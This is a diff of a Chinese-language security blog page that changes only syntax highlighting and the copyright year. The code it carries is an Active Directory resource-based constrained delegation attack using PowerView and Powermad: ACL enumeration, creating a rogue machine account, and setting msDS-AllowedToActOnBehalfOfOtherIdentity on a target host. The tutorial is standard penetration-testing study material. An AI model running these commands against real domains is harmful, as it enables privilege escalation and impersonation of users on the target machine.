@@ -677,10 +677,10 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 查看 SID</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="no">[userName]</span> <span class="n">-Properties</span> <span class="n">objectsid</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="p">[</span><span class="no">userName</span><span class="p">]</span> <span class="n">-Properties</span> <span class="n">objectsid</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c"># 查看写权限</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="no">[computerName]</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="s2">&#34;SID&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="p">[</span><span class="no">computerName</span><span class="p">]</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="py">SecurityIdentifier</span> <span class="o">-match</span> <span class="s2">&#34;SID&#34;</span><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
@@ -702,8 +702,8 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span>
-</span></span><span class="line"><span class="cl"><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">evilsystem</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;testObject&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">evilsystem</span> <span class="n">-Password</span> <span class="vm">$</span><span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;testObject&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>添加了一个密码 testObject，名为 hacksystem 的机器账户，接下来就是配置 hacksystem 到 WIN7 的委派了。我们需要做的，是修改 WIN7 的  <code>msDS-AllowedToActOnBehalfOfOtherIdentity </code> 属性的值 ，这个操作我们用 powerview 实现。</p>
@@ -728,13 +728,13 @@
 </span></span><span class="line"><span class="cl"><span class="nb">Get-Domiancomputer</span> <span class="n">hacksystem</span>
 </span></span><span class="line"><span class="cl"><span class="c"># 获取</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="py">AccessControl</span><span class="p">.</span><span class="py">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&#34;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SD</span><span class="p">.</span><span class="py">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="p">[</span><span class="n">目标主机名</span><span class="p">]|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="p">[</span><span class="n">目标主机名</span><span class="p">]|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="vm">@</span><span class="p">{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>验证是否成功添加：</p>
@@ -856,7 +856,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
